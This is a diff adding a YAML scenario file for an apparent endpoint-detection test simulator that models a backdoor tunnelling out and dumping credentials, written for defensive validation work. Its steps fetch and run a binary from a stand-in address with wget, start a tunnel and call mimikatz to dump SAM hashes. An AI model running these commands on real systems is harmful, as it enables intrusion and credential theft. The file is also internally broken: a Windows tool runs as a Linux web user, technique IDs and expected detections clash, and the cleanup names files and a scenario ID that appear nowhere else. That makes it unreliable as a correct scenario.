@@ -1,0 +1,135 @@
+scenario_id: SIM-EDR-026
+name: TinyRCT Backdoor Establishes VPN Tunnel and Dumps Credentials
+version: '1.0'
+status: active
+plane: EDR
+detection_types:
+- BIOC
+- XQL
+- IOC
+uc_ref: UCS-EDR-02
+tc_ref: TC-EDR-03
+tc_refs:
+- TC-EDR-03
+- TC-EDR-05
+pov_scenario_id: POV-SC-021
+uc_name: Endpoint Detection & Response
+tc_name: Validate multi-method malware detection (local sandbox, behavioral, static analysis)
+mitre_tactic: TA0006
+mitre_tactic_name: Credential Access
+mitre_technique: T1003.008
+mitre_technique_name: 'OS Credential Dumping: /etc/passwd and /etc/shadow'
+additional_techniques:
+- technique: T1552.001
+  name: 'Unsecured Credentials: Credentials In Files'
+- technique: T1003
+  name: OS Credential Dumping
+threat_report: 'Unit42 - Rocke: The Champion of Monero Miners'
+threat_report_url: https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/
+execution_identity:
+  default: www-data
+  options:
+  - www-data
+  - root
+  - nobody
+  - svc-backup
+push_supported: true
+pull_supported: true
+validation_methodology: Endpoint Signal Injection & Detection Accuracy
+methodology_family: F1
+primary_kpi: MTTD
+threshold:
+  kpi: MTTD
+  op: ≤
+  value: 300
+  unit: seconds
+success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected
+
+  XDR BIOC / XQL detections, and the mean time from signal emit to alert
+
+  creation is within the MTTD budget. Each step''s expected_detections row is
+
+  validated against dataset=xdr_data.
+
+  '
+moat_tier: LEAD
+cgo_anchor:
+  image_name: apache2
+  primary_username: www-data
+external_tools:
+- name: Atomic Red Team
+  source: https://github.com/redcanaryco/atomic-red-team
+  type: script
+  install_inline: false
+  adapter_ref: TOOL-ATOMIC-RED-TEAM
+- name: mimipenguin
+  source: https://github.com/huntergregal/mimipenguin
+  type: script
+  install_inline: true
+steps:
+- id: step-01
+  name: Download VPN Client
+  command: wget -O /tmp/softether https://192.0.2.100/tunnel
+  identity: www-data
+  mitre_technique: T1572
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: VPN Tunnel Process Creation
+    ttp_ref: TTP-2026-0186
+    detection_id: bioc-vpn-tunnel-process-creation
+- id: step-02
+  name: Make Executable
+  command: chmod +x /tmp/softether
+  identity: www-data
+  mitre_technique: T1572
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: VPN Tunnel Process Creation
+    ttp_ref: TTP-2026-0186
+    detection_id: bioc-vpn-tunnel-process-creation
+  causality:
+    parent_step: step-01
+    pivot: process_lineage
+- id: step-03
+  name: Establish Tunnel
+  command: /tmp/softether --connect
+  identity: www-data
+  mitre_technique: T1572
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: C2 Network Connection
+    ttp_ref: TTP-2026-0186
+    detection_id: bioc-c2-network-connection
+  causality:
+    parent_step: step-02
+    pivot: process_lineage
+- id: step-04
+  name: Dump Credentials
+  command: mimikatz.exe lsadump::sam
+  identity: www-data
+  mitre_technique: T1003.001
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: C2 Network Connection
+    ttp_ref: TTP-2026-0186
+    detection_id: bioc-c2-network-connection
+  causality:
+    parent_step: step-03
+    pivot: process_lineage
+cleanup:
+  commands:
+  - rm -f /tmp/mimipenguin.sh /tmp/mimi_output.txt
+  - echo '[CortexSim] SIM-EDR-001 cleanup complete'
+author: Henry Reed
+created: '2026-04-14'
+last_updated: '2026-04-14'
+tags:
+- credential-access
+- mimipenguin
+- shadow-file
+- ssh-keys
+- endpoint-security
